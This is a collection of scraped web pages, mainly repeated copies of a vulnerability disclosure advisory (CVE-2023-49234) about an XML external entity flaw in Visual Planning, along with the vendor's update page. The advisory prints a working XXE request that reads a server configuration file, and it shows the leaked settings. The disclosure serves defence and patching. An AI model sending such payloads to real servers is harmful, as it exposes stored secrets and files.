=== Content from seclists.org_7efceb5b_20250110_194720.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](6)

![](/shared/images/nst-icons.svg#search)

# SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning

---

*From*: Lennert Preuth via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 3 Apr 2024 17:13:41 +0200

---

```

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Title
=====

```
SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in
Visual Planning
```

Status
======

PUBLISHED

Version
=======

1.0

CVE reference
=============

CVE-2023-49234

Link
====

<https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-006/>

Text-only version:
<https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-006.txt>

Affected products/vendor
========================

All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.

Summary
=======

```
Authenticated attackers can exploit a weakness in the XML parser
functionality of the Visual Planning[0] application in order to obtain
read access to arbitrary files on the application server. Depending on
configured access permissions, this vulnerability could be used by an
attacker to exfiltrate secrets stored on the local file system.
```

Risk
====

```
An attacker can use the vulnerability to gather information and
depending on the stored data, exfiltrate secrets from the file system.
Furthermore, HTTP requests can be used for out-of-bands exfiltration and
possibly server side request forgery (SSRF) attacks.
```

Description
===========

```
During a recent red teaming assessment, Visual Planning was identified
as part of the customers internet-facing assets. The software is
developed by STILOG I.S.T. and provides resource management and
scheduling features. A security assessment conducted by SCHUTZWERK found
an arbitrary file read vulnerability via XML external entities in Visual
Planning.
The application Admin Center (vpadmin) communicates with the server
through an XML-based protocol that utilizes proprietary compression
methods and is transmitted via HTTP. SCHUTZWERK implemented a custom
proxy as part of an assessment in order to intercept and manipulate the
messages exchanged between application and server.
```

```
One of the messages sent by the Admin Center application after
authentication is the following:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.parameters.GetApplicationProperty>
<defaultValue>

</defaultValue>
<propertyName>PWD</propertyName>
<rawResult>false</rawResult>
<section>INSTALLDATA</section>
<userSession isNull="true"/>
</com.visualplanning.query.parameters.GetApplicationProperty>

```
The method GetApplicationProperty is called to request the value of the
property PWD. The server responds with an XML message, where the value
element contains the response of the query:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.result.ApplicationPropertyResult>
<resultValues/>
<status>OK</status>
<value>

</value>
</com.visualplanning.query.result.ApplicationPropertyResult>

```
In this response it was observed that if the requested property value
could not be resolved, the content of the request element defaultValue
will be reflected as part of the response, making it a suitable back
channel for XML external entity (XXE) injections.
```

The following message was sent to the Visual Planning application:

<?xml version="1.0" encoding="UTF-8"?>

```
<!DOCTYPE foo [<!ENTITY example SYSTEM
"C:\xampp2\tomcat\webapps\vplanning\configuration\install.properties"> ]>
```

<com.visualplanning.query.parameters.GetApplicationProperty>
<defaultValue>&example;</defaultValue>
<propertyName>ShowBackground</propertyName>
<rawResult>false</rawResult>
<section>Application</section>
<userSession isNull="true"/>
</com.visualplanning.query.parameters.GetApplicationProperty>

```
The server responds with the content of the requested install.properties
file inside the value element, thus confirming the XML parser is
vulnerable to XML external entity (XXE) injections:
```

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.result.ApplicationPropertyResult>
<resultValues/>
<status>OK</status>
<value>#
#Tue Oct 03 15:37:33 CEST 2023
INSTALLDATA.INSTALLSERIAL=
INSTALLDATA.INSTALLURL=http\://127.0.0.1\:8080/vplanning
INSTALLDATA.OK=Next
INSTALLDATA.PAGE=PROVIDER
INSTALLDATA.POOLMODE=1
INSTALLDATA.PORT=3306
INSTALLDATA.PROVIDERTYPE=MySQL
INSTALLDATA.PWD=ENCODE\:
INSTALLDATA.SERVER=127.0.0.1
INSTALLDATA.SERVERLANG=de
INSTALLDATA.USER=root
INSTALLDATA.VIEWERSERIAL=
</value>
</com.visualplanning.query.result.ApplicationPropertyResult>

```
Further testing showed that out-of-bands exfiltration via HTTPS requests
is also generally possible.
```

Solution/Mitigation
===================

The vendor suggests to update to Visual Planning 8 (Build 240207)

Disclosure timeline
===================

2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor

```
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings
is in progress
2024-01-30: Inquired about mitigation status regarding the reported
vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were
already fixed
```

2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory

Contact/Credits
===============

```
The vulnerability was discovered during an assessment by Lennert Preuth
and David Brown of SCHUTZWERK GmbH.
```

References
==========

[0] <https://www.visual-planning.com/en/>

Disclaimer
==========

```
The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
most recent version of this security advisory can be found at SCHUTZWERK
GmbH's website ( <https://www.schutzwerk.com> ).
```

Additional information
======================

SCHUTZWERK Advisories: <https://www.schutzwerk.com/blog/tags/advisories/>

SCHUTZWERK Advisory Policy: <https://www.schutzwerk.com/en/advisories/>
-----BEGIN PGP SIGNATURE-----

iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0bcaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrsdwA/+MyfbZTe36+AYi9q6GJE6
S75Xm2aZtEM3NC5F6aMcELqFEW7LNjERmBoqfkHe+SWfgFxeCXl/XelHaNnR7HTM
ZZPCGwJmOI+XaraInPVdCDw1QVIdiCG4VZzE0tlnFbLBgM+OTOxcDOoG7OhzP6mm
ALfankzxu3AfbZhwebQtSXIQ+YqjitTsvjQGPleylqYK5CJbChsyvmMjomu/GzdO
sWQ25ODCVUy6VORet8yn5OkQnM2CjSkteuTdNxCzd6JUB+vQ0g5FCE5NVzkqYq21
YJ4Fc3PgkyAnrGefSbueL+Z/K6btM8RysJAwGahIEOdlkG8W/p09L0QQUGERT2VN
UO6oTi/1OyoJBV9L5umr6aHss3P92ln90UAUW2dlZOdGSB8rlXisxLC1wtFZAXH9
YwiGY/ACXmV1FtQQpgFxfNRyEWaltU5S0Y0bPAaW+ABSMLlK4X0Ft9E/4s4Yel2d
TGngEnVKcR/PKNtrJbBqPDwt98R0MdQi0QxBRaxGxAg4Yr1qex8ph6IRT7bDTm0/
1CKlQL7y9uvXlnFE4CO3IkKNp0ejKn3A7QEep4jit07VItIc+sRsoMnB6v54DoML
ZfIisDoijb3doTNieyMpgTGZTDWLwLO36IS9JiqafNCAnngExqylFX6vYQVggtRz
mZ2yA2/9ZfQwOawEirQtQr8=
=TUGM
-----END PGP SIGNATURE-----

--
SCHUTZWERK GmbH, Pfarrer-Weiß-Weg 12, 89077 Ulm, Germany
Zertifiziert / Certified ISO 27001, 9001 and TISAX

Phone +49 731 977 191 0

advisories () schutzwerk com / www.schutzwerk.com

Geschäftsführer / Managing Directors:
Jakob Pietzka, Michael Schäfer

Amtsgericht Ulm / HRB 727391
Datenschutz / Data Protection www.schutzwerk.com/datenschutz

```

**Attachment:
[OpenPGP\_signature.asc](att-3/OpenPGP_signature_asc.bin)**

*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](6)

### Current thread:

* **SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning** *Lennert Preuth via Fulldisclosure (Apr 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.visual-planning.com_566e5039_20250110_194721.html ===
 ![LOGO-Visual-Planning-espace-clients-250](https://www.visual-planning.com/en/wp-content/uploads/2022/04/LOGO-Visual-Planning-espace-clients-250.png)

* [Support Portal](https://www.visual-planning.com/en/support-portal)
* [HotTicket](https://www.visual-planning.com/en/support-portal/hotticket)
* [Updates](https://www.visual-planning.com/en/support-portal/updates)
* Tools
  + [VPDeskLauncher](https://www.visual-planning.com/en/support-portal/vpdesk-new-launcher)
  + [Remote support](https://www.visual-planning.com/en/support-portal/remote-support)
* [Knowledge Base](https://www.visual-planning.com/en/support-portal/knowledge-base)
* [![Back to Visual Planning](https://www.visual-planning.com/en/wp-content/uploads/2021/01/cropped-LOGO-VP-Flat-icon-300x300.png "Retour menu principal")](https://www.visual-planning.com/en/)

# Visual Planning Update

## Make sure you have the latestfeatures of your software

![](https://www.visual-planning.com/en/wp-content/uploads/2021/12/mise-a-jour-visual-planning.jpg)
## Visual Planning Update

### I HAVE VISUAL PLANNING 9 INSTALLED ON MY SERVER

To update your Visual Planning installation with the latest build release, please simply enter your serial number in the box below and [follow the instructions from our self-help knowledge base.](https://www.visual-planning.com/documentation/env9/home/installing-updating-visual-planning-entreprise/minor-updates-unistalling-vp-enterprise "How to install a minor build release in Visual Planning 9 Enterprise.")

### I DO NOT HAVE VISUAL PLANNING 9 BUT HAVE AN OLDER VISUAL PLANNING INSTALLATION

If you currently have a valid maintenance contract with us, you can upgrade to Visual Planning 9 for free and download Visual Planning 9 install files by entering your serial number in the box below. Please then follow steps to complete the 9 upgrade [as described in this section of the documentation](https://www.visual-planning.com/documentation/env9/home/installing-updating-visual-planning-entreprise/major-updates-vp-enterprise).

### I NEED HELP WITH MY VISUAL PLANNING UPDATE

Please refer to our [self-help knowledge base](https://www.visual-planning.com/en/support-portal/knowledge-base "Visual Planning self-help knowledge base") or contact our helpdesk through support@stilog.com.

### DOWNLOAD OUR LATEST UPDATE:

    ![logo visual planning blanc](https://www.visual-planning.com/en/wp-content/uploads/2021/11/LOGO-VisualPlanning-blanc1.png "LOGO-VisualPlanning-blanc1") [![logo stilog blanc](https://www.visual-planning.com/en/wp-content/uploads/2021/11/LOGO-STILOG-blanc-250.png "LOGO-STILOG-blanc-250")](https://stilog.com/en/) [![ICE Groupe logo 2023](https://www.visual-planning.com/en/wp-content/uploads/2020/08/Logo_ICE_Groupe_2023_blanc_100.png "Logo_ICE_Groupe_2023_blanc_100")](https://www.icegroupe.com/)
#### Our competences

* [Project Management](https://www.visual-planning.com/en/why-visual-planning/solutions/project-management-software)
* [Construction Scheduling](https://www.visual-planning.com/en/why-visual-planning/solutions/construction-scheduling-software)
* [Field Service Scheduling](https://www.visual-planning.com/en/why-visual-planning/solutions/field-service-scheduling)
* [Employee scheduling software & time tracking](https://www.visual-planning.com/en/why-visual-planning/solutions/employee-scheduling-software)
* [Fleet Management](https://www.visual-planning.com/en/why-visual-planning/solutions/fleet-management)
* [Production Scheduling Software](https://www.visual-planning.com/en/why-visual-planning/solutions/production-scheduling-software)
* [CRM](https://www.visual-planning.com/en/why-visual-planning/solutions/crm)
#### Read more

* [The Company](https://www.visual-planning.com/en/company)
* [Partnership Program](https://www.visual-planning.com/en/company/partner-directory)
* [Partner Directory](https://www.visual-planning.com/en/company/partner-directory/our-partners)
* [Case Studies & Testimonials](https://www.visual-planning.com/en/resources/case-studies-testimonials)
* [Blog](https://www.visual-planning.com/en/resources/blog)
* [Recruitment](https://stilog.com/fr/carriere/)
* [Sitemap](https://www.visual-planning.com/en/sitemap)
* [Ask a question](https://www.visual-planning.com/en/company/ask-a-question)
Follow us

* [Follow](https://www.linkedin.com/company/visualplanning/posts/?feedView=all&viewAsMember=true "Follow on LinkedIn")
* [Follow](https://www.youtube.com/user/TheVisualplanning "Follow on Youtube")
* [Follow](https://twitter.com/visualplanning "Follow on X")
* [Follow](https://www.facebook.com/visualplanningALL "Follow on Facebook")

Download our mobile application Visual Planning VPGO

[![](https://www.visual-planning.com/en/wp-content/uploads/2022/05/logo-google-play-150.png)](https://play.google.com/store/apps/details?id=com.stilog.VPGOU "Get VPGO on Google Play") [![logo-app-store-150](https://www.visual-planning.com/en/wp-content/uploads/2022/05/logo-app-store-150.png)](https://apps.apple.com/us/app/vpgo-u/id1598862750 "Get VPGO on the AppStore")

    Subscribe to Visual Planning Newsletters

Copyrights [Stilog I.S.T.](https://stilog.com/en/ "Our company") 1996-2025 | Visual Planning © is a registred trademark of Stilog I.S.T. | [Credits](https://www.visual-planning.com/en/credits "Credits") | [Terms & conditions](https://www.visual-planning.com/en/terms-conditions) | [Legales](https://www.visual-planning.com/en/legales-2) | [GDPR](https://www.visual-planning.com/en/blog/visual-planning-complying-gdpr) | Non-contactual photos

 ![Recevez nos dernières informations et mises à jour sur Visual Planning](https://www.visual-planning.com/en/wp-content/plugins/bloom/images/premade-image-01.png)
## Recevez nos dernières informations et mises à jour sur Visual Planning

     Je m'inscris !
## Merci pour votre inscription !

  ![Get resource management and scheduling tips and tricks](https://www.visual-planning.com/en/wp-content/plugins/bloom/images/premade-image-01.png)
## Get resource management and scheduling tips and tricks

News, software updates, fairs and much more...

  Subscribe!
## Thank you for your registration!

         ![](https://px.ads.linkedin.com/collect/?pid=2960778&fmt=gif)

=== Content from www.schutzwerk.com_62876fe6_20250110_194721.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Title
=====
SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning
Status
======
PUBLISHED
Version
=======
1.0
CVE reference
=============
CVE-2023-49234
Link
====
https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-006/
Text-only version:
https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-006.txt
Affected products/vendor
========================
All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.
Summary
=======
Authenticated attackers can exploit a weakness in the XML parser functionality of the Visual Planning[0] application in order to obtain read access to arbitrary files on the application server. Depending on configured access permissions, this vulnerability could be used by an attacker to exfiltrate secrets stored on the local file system.
Risk
====
An attacker can use the vulnerability to gather information and depending on the stored data, exfiltrate secrets from the file system. Furthermore, HTTP requests can be used for out-of-bands exfiltration and possibly server side request forgery (SSRF) attacks.
Description
===========
During a recent red teaming assessment, Visual Planning was identified as part of the customers internet-facing assets. The software is developed by STILOG I.S.T. and provides resource management and scheduling features. A security assessment conducted by SCHUTZWERK found an arbitrary file read vulnerability via XML external entities in Visual Planning.
The application Admin Center (vpadmin) communicates with the server through an XML-based protocol that utilizes proprietary compression methods and is transmitted via HTTP. SCHUTZWERK implemented a custom proxy as part of an assessment in order to intercept and manipulate the messages exchanged between application and server.
One of the messages sent by the Admin Center application after authentication is the following:
xml version="1.0" encoding="UTF-8"?

PWD
false
INSTALLDATA

The method GetApplicationProperty is called to request the value of the property PWD. The server responds with an XML message, where the value element contains the response of the query:
xml version="1.0" encoding="UTF-8"?

OK

In this response it was observed that if the requested property value could not be resolved, the content of the request element defaultValue will be reflected as part of the response, making it a suitable back channel for XML external entity (XXE) injections.
The following message was sent to the Visual Planning application:
xml version="1.0" encoding="UTF-8"?
 ]>
&example
ShowBackground
false
Application

The server responds with the content of the requested install.properties file inside the value element, thus confirming the XML parser is vulnerable to XML external entity (XXE) injections:
xml version="1.0" encoding="UTF-8"?

OK
#
#Tue Oct 03 15:37:33 CEST 2023
INSTALLDATA.INSTALLSERIAL=
INSTALLDATA.INSTALLURL=http\://127.0.0.1\:8080/vplanning
INSTALLDATA.OK=Next
INSTALLDATA.PAGE=PROVIDER
INSTALLDATA.POOLMODE=1
INSTALLDATA.PORT=3306
INSTALLDATA.PROVIDERTYPE=MySQL
INSTALLDATA.PWD=ENCODE\:
INSTALLDATA.SERVER=127.0.0.1
INSTALLDATA.SERVERLANG=de
INSTALLDATA.USER=root
INSTALLDATA.VIEWERSERIAL=

Further testing showed that out-of-bands exfiltration via HTTPS requests is also generally possible.
Solution/Mitigation
===================
The vendor suggests to update to Visual Planning 8 (Build 240207)
Disclosure timeline
===================
2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings is in progress
2024-01-30: Inquired about mitigation status regarding the reported vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were already fixed
2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory
Contact/Credits
===============
The vulnerability was discovered during an assessment by Lennert Preuth and David Brown of SCHUTZWERK GmbH.
References
==========
[0] https://www.visual-planning.com/en/
Disclaimer
==========
The information provided in this security advisory is provided "as is" and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible. The most recent version of this security advisory can be found at SCHUTZWERK GmbH's website ( https://www.schutzwerk.com ).
Additional information
======================
SCHUTZWERK Advisories: https://www.schutzwerk.com/blog/tags/advisories/
SCHUTZWERK Advisory Policy: https://www.schutzwerk.com/en/advisories/
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0bcaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrsdwA/+MyfbZTe36+AYi9q6GJE6
S75Xm2aZtEM3NC5F6aMcELqFEW7LNjERmBoqfkHe+SWfgFxeCXl/XelHaNnR7HTM
ZZPCGwJmOI+XaraInPVdCDw1QVIdiCG4VZzE0tlnFbLBgM+OTOxcDOoG7OhzP6mm
ALfankzxu3AfbZhwebQtSXIQ+YqjitTsvjQGPleylqYK5CJbChsyvmMjomu/GzdO
sWQ25ODCVUy6VORet8yn5OkQnM2CjSkteuTdNxCzd6JUB+vQ0g5FCE5NVzkqYq21
YJ4Fc3PgkyAnrGefSbueL+Z/K6btM8RysJAwGahIEOdlkG8W/p09L0QQUGERT2VN
UO6oTi/1OyoJBV9L5umr6aHss3P92ln90UAUW2dlZOdGSB8rlXisxLC1wtFZAXH9
YwiGY/ACXmV1FtQQpgFxfNRyEWaltU5S0Y0bPAaW+ABSMLlK4X0Ft9E/4s4Yel2d
TGngEnVKcR/PKNtrJbBqPDwt98R0MdQi0QxBRaxGxAg4Yr1qex8ph6IRT7bDTm0/
1CKlQL7y9uvXlnFE4CO3IkKNp0ejKn3A7QEep4jit07VItIc+sRsoMnB6v54DoML
ZfIisDoijb3doTNieyMpgTGZTDWLwLO36IS9JiqafNCAnngExqylFX6vYQVggtRz
mZ2yA2/9ZfQwOawEirQtQr8=
=TUGM
-----END PGP SIGNATURE-----

=== Content from www.schutzwerk.com_6a95c4cc_20250110_194721.html ===
![](data:image/svg+xml...)
diamond\_fulldiamonddiamond\_halfdiamond\_eurosearch-iconmenuchat-iconclose-iconenvelope-iconsmartphone-call-icon

* Leistungen
  + [PrÃ¼fung](https://www.schutzwerk.com/pruefung)
  + [Beratung](https://www.schutzwerk.com/beratung)
  + [Prozesse](https://www.schutzwerk.com/prozesse)
  + [FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)
  + [Referenzen](https://www.schutzwerk.com/referenzen)
  + [Advisories](https://www.schutzwerk.com/advisories)
* Unternehmen
  + [Blog & News](https://www.schutzwerk.com/blog)
  + [Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)
  + [Team](https://www.schutzwerk.com/team)
  + [Partner](https://www.schutzwerk.com/partner)
  + [Zertifizierungen](https://www.schutzwerk.com/zertifizierung)* + Advisory: Arbitrary File Read via XML External Entities in Visual Planning (CVE-2023-49234)
* Karriere
  + [Freie Stellen](https://www.schutzwerk.com/freie-stellen)
  + [Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)
[![SCHUTZWERK-logo](https://www.schutzwerk.com/media/schutzwerk_logo.svg)](https://www.schutzwerk.com/)

---

[![language-icon](https://www.schutzwerk.com/media/icons/en.svg)](https://www.schutzwerk.com/en/blog/schutzwerk-sa-2023-006/)
[![contact-icon](https://www.schutzwerk.com/media/contact/mail.svg)](https://www.schutzwerk.com/ansprechpartner/)

![burgermenu-icon](https://www.schutzwerk.com/media/icons/bars.svg)[![SCHUTZWERK-logo](https://www.schutzwerk.com/media/schutzwerk_logo.svg)](https://www.schutzwerk.com/)

---

[![language-icon](https://www.schutzwerk.com/media/icons/en.svg)](https://www.schutzwerk.com/en/blog/schutzwerk-sa-2023-006/)
[![contact-icon](https://www.schutzwerk.com/media/contact/mail.svg)](https://www.schutzwerk.com/ansprechpartner/)
![close-icon](https://www.schutzwerk.com/media/icons/close.svg)
Leistungen

[* PrÃ¼fung](https://www.schutzwerk.com/pruefung)[* Beratung](https://www.schutzwerk.com/beratung)[* Prozesse](https://www.schutzwerk.com/prozesse)[* FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)[* Referenzen](https://www.schutzwerk.com/referenzen)[* Advisories](https://www.schutzwerk.com/advisories)
Unternehmen

[* Blog & News](https://www.schutzwerk.com/blog)[* Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)[* Team](https://www.schutzwerk.com/team)[* Partner](https://www.schutzwerk.com/partner)[* Zertifizierungen](https://www.schutzwerk.com/zertifizierung)
Karriere

[* Freie Stellen](https://www.schutzwerk.com/freie-stellen)[* Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)
Kontakt

[* Ansprechpartner](https://www.schutzwerk.com/ansprechpartner)[* Anfahrt und Parken](https://www.schutzwerk.com/anfahrt-und-parken)
# Blog & News

### 28. MÃ¤rz, 2024

[#ADVISORIES](https://www.schutzwerk.com/blog/tags/advisories/)
## Advisory: Arbitrary File Read via XML External Entities in Visual Planning (CVE-2023-49234)

## Release of SCHUTZWERK-SA-2023-006

![preview-image for SCHUTZWERK-SA-2023-006](https://www.schutzwerk.com/blog/schutzwerk-sa-2023-006/security_advisory_banner.png)
```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Title
=====

SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning

Status
======

PUBLISHED

Version
=======

1.0

CVE reference
=============

CVE-2023-49234

Link
====

https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-006/

Text-only version:
https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-006.txt

Affected products/vendor
========================

All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.

Summary
=======

Authenticated attackers can exploit a weakness in the XML parser functionality of the Visual Planning[0] application in order to obtain read access to arbitrary files on the application server. Depending on configured access permissions, this vulnerability could be used by an attacker to exfiltrate secrets stored on the local file system.

Risk
====

An attacker can use the vulnerability to gather information and depending on the stored data, exfiltrate secrets from the file system. Furthermore, HTTP requests can be used for out-of-bands exfiltration and possibly server side request forgery (SSRF) attacks.

Description
===========

During a recent red teaming assessment, Visual Planning was identified as part of the customers internet-facing assets. The software is developed by STILOG I.S.T. and provides resource management and scheduling features. A security assessment conducted by SCHUTZWERK found an arbitrary file read vulnerability via XML external entities in Visual Planning.
The application Admin Center (vpadmin) communicates with the server through an XML-based protocol that utilizes proprietary compression methods and is transmitted via HTTP. SCHUTZWERK implemented a custom proxy as part of an assessment in order to intercept and manipulate the messages exchanged between application and server.

One of the messages sent by the Admin Center application after authentication is the following:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.parameters.GetApplicationProperty>
<defaultValue>

</defaultValue>
<propertyName>PWD</propertyName>
<rawResult>false</rawResult>
<section>INSTALLDATA</section>
<userSession isNull="true"/>
</com.visualplanning.query.parameters.GetApplicationProperty>

The method GetApplicationProperty is called to request the value of the property PWD. The server responds with an XML message, where the value element contains the response of the query:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.result.ApplicationPropertyResult>
<resultValues/>
<status>OK</status>
<value>

</value>
</com.visualplanning.query.result.ApplicationPropertyResult>

In this response it was observed that if the requested property value could not be resolved, the content of the request element defaultValue will be reflected as part of the response, making it a suitable back channel for XML external entity (XXE) injections.

The following message was sent to the Visual Planning application:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "C:\xampp2\tomcat\webapps\vplanning\configuration\install.properties"> ]>
<com.visualplanning.query.parameters.GetApplicationProperty>
<defaultValue>&example;</defaultValue>
<propertyName>ShowBackground</propertyName>
<rawResult>false</rawResult>
<section>Application</section>
<userSession isNull="true"/>
</com.visualplanning.query.parameters.GetApplicationProperty>

The server responds with the content of the requested install.properties file inside the value element, thus confirming the XML parser is vulnerable to XML external entity (XXE) injections:

<?xml version="1.0" encoding="UTF-8"?>
<com.visualplanning.query.result.ApplicationPropertyResult>
<resultValues/>
<status>OK</status>
<value>#
#Tue Oct 03 15:37:33 CEST 2023
INSTALLDATA.INSTALLSERIAL=
INSTALLDATA.INSTALLURL=http\://127.0.0.1\:8080/vplanning
INSTALLDATA.OK=Next
INSTALLDATA.PAGE=PROVIDER
INSTALLDATA.POOLMODE=1
INSTALLDATA.PORT=3306
INSTALLDATA.PROVIDERTYPE=MySQL
INSTALLDATA.PWD=ENCODE\:
INSTALLDATA.SERVER=127.0.0.1
INSTALLDATA.SERVERLANG=de
INSTALLDATA.USER=root
INSTALLDATA.VIEWERSERIAL=
</value>
</com.visualplanning.query.result.ApplicationPropertyResult>

Further testing showed that out-of-bands exfiltration via HTTPS requests is also generally possible.

Solution/Mitigation
===================

The vendor suggests to update to Visual Planning 8 (Build 240207)

Disclosure timeline
===================

2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor
2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings is in progress
2024-01-30: Inquired about mitigation status regarding the reported vulnerabilities
2024-01-30: Vendor informed SCHUTZWERK that some of the issues were already fixed
2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory

Contact/Credits
===============

The vulnerability was discovered during an assessment by Lennert Preuth and David Brown of SCHUTZWERK GmbH.

References
==========

[0] https://www.visual-planning.com/en/

Disclaimer
==========

The information provided in this security advisory is provided "as is" and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible. The most recent version of this security advisory can be found at SCHUTZWERK GmbH's website ( https://www.schutzwerk.com ).

Additional information
======================

SCHUTZWERK Advisories: https://www.schutzwerk.com/blog/tags/advisories/

SCHUTZWERK Advisory Policy: https://www.schutzwerk.com/en/advisories/
-----BEGIN PGP SIGNATURE-----

iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0bcaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrsdwA/+MyfbZTe36+AYi9q6GJE6
S75Xm2aZtEM3NC5F6aMcELqFEW7LNjERmBoqfkHe+SWfgFxeCXl/XelHaNnR7HTM
ZZPCGwJmOI+XaraInPVdCDw1QVIdiCG4VZzE0tlnFbLBgM+OTOxcDOoG7OhzP6mm
ALfankzxu3AfbZhwebQtSXIQ+YqjitTsvjQGPleylqYK5CJbChsyvmMjomu/GzdO
